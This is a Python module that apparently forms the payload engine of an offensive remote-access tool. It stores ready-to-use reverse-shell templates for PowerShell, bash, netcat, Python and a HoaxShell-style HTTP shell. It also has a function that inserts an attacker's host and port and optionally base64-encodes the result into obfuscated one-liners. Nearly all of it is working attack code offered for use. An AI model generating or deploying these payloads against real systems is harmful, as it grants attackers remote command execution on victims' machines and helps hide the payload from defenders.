import base64
from pathlib import Path
from typing import Optional
from app.utils.logger import get_logger

logger = get_logger("payload_engine")

BUILTIN_TEMPLATES = [
    {
        "id": "ps_tcp_rev",
        "name": "PowerShell TCP Reverse",
        "os_type": "windows",
        "shell_type": "tcp",
        "template": (
            '$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
            '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{'
            '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            '$sendback = (iex $data 2>&1 | Out-String);'
            '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
            '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
            '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};'
            '$client.Close()'
        ),
    },
    {
        "id": "bash_tcp_rev",
        "name": "Bash TCP Reverse",
        "os_type": "linux",
        "shell_type": "tcp",
        "template": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    },
    {
        "id": "nc_rev",
        "name": "Netcat Reverse",
        "os_type": "linux",
        "shell_type": "netcat",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    },
    {
        "id": "py_tcp_rev",
        "name": "Python TCP Reverse",
        "os_type": "linux",
        "shell_type": "tcp",
        "template": (
            "python3 -c 'import socket,subprocess,os;"
            's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            's.connect(("{lhost}",{lport}));'
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            'subprocess.call(["/bin/sh","-i"])\''
        ),
    },
    {
        "id": "ps_hoax",
        "name": "HoaxShell PowerShell",
        "os_type": "windows",
        "shell_type": "hoaxshell",
        "template": (
            '$s="{lhost}:{lport}";while($true){{'
            '$c=(IWR -UseBasicParsing -Uri "http://$s/get").Content;'
            'if($c -ne "None"){{'
            '$r=iex "$c" -ErrorAction Stop -ErrorVariable e 2>&1|Out-String;'
            '$r=$r+"PS "+(pwd).Path+"> ";'
            'IWR -UseBasicParsing -Uri "http://$s/post" -Method POST '
            '-Body ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($r)))'
            '}};sleep 0.8}}'
        ),
    },
]

VILLAIN_TEMPLATE_DIR = Path(__file__).parent.parent.parent / "villain"


def get_templates(
    os_type: Optional[str] = None, shell_type: Optional[str] = None
) -> list:
    results = BUILTIN_TEMPLATES[:]
    if os_type:
        results = [t for t in results if t["os_type"] == os_type]
    if shell_type:
        results = [t for t in results if t["shell_type"] == shell_type]
    return [
        {"id": t["id"], "name": t["name"], "os_type": t["os_type"], "shell_type": t["shell_type"]}
        for t in results
    ]


def scan_villain_templates() -> list:
    extras = []
    payloads_dir = VILLAIN_TEMPLATE_DIR / "Core" / "payloads"
    if not payloads_dir.exists():
        return extras
    for f in payloads_dir.glob("*.py"):
        extras.append(
            {
                "id": f"villain_{f.stem}",
                "name": f"Villain: {f.stem}",
                "os_type": "windows" if "win" in f.stem.lower() else "linux",
                "shell_type": "tcp",
            }
        )
    return extras


def generate_payload(
    os_type: str,
    shell_type: str,
    lhost: str,
    lport: int,
    template: Optional[str] = None,
    encode: bool = False,
) -> str:
    tmpl = None
    if template:
        for t in BUILTIN_TEMPLATES:
            if t["id"] == template:
                tmpl = t
                break

    if not tmpl:
        for t in BUILTIN_TEMPLATES:
            if t["os_type"] == os_type and t["shell_type"] == shell_type:
                tmpl = t
                break

    if not tmpl:
        for t in BUILTIN_TEMPLATES:
            if t["os_type"] == os_type:
                tmpl = t
                break

    if not tmpl:
        tmpl = BUILTIN_TEMPLATES[0]

    payload = tmpl["template"].format(lhost=lhost, lport=lport)

    if encode:
        if os_type == "windows":
            encoded = base64.b64encode(payload.encode("utf-16le")).decode()
            payload = f"powershell -e {encoded}"
        else:
            encoded = base64.b64encode(payload.encode()).decode()
            payload = f"echo {encoded} | base64 -d | bash"

    logger.info(
        f"Generated payload: os={os_type}, shell={shell_type}, lhost={lhost}, lport={lport}"
    )
    return payload
